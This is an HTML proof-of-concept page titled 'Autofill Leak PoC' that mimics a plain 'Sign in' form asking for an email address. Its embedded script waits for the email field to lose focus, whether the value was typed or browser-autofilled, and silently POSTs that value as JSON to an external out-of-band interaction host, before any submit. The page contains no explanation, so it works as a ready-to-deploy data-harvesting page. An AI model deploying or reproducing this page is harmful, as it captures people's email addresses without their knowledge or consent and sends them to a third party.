<!DOCTYPE html>
<html>
<head>
  <title>Autofill Leak PoC</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f2f2f2;
      padding: 60px;
    }

    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 10px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }

    input[type="email"] {
      width: 100%;
      font-size: 16px;
      padding: 12px;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 20px;
    }

    button {
      padding: 12px 20px;
      font-size: 16px;
      background-color: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>Sign in</h2>
    <form>
      <input type="email" id="emailInput" name="email" autocomplete="email" placeholder="Enter your email" />
      <button type="submit">Continue</button>
    </form>
  </div>

  <script>
    const emailInput = document.getElementById('emailInput');

    // When user types or autofill injects email and field loses focus
    emailInput.addEventListener('blur', () => {
      const value = emailInput.value.trim();
      if (value) {
        fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email: value })
        });
      }
    });
  </script>

</body>
</html>
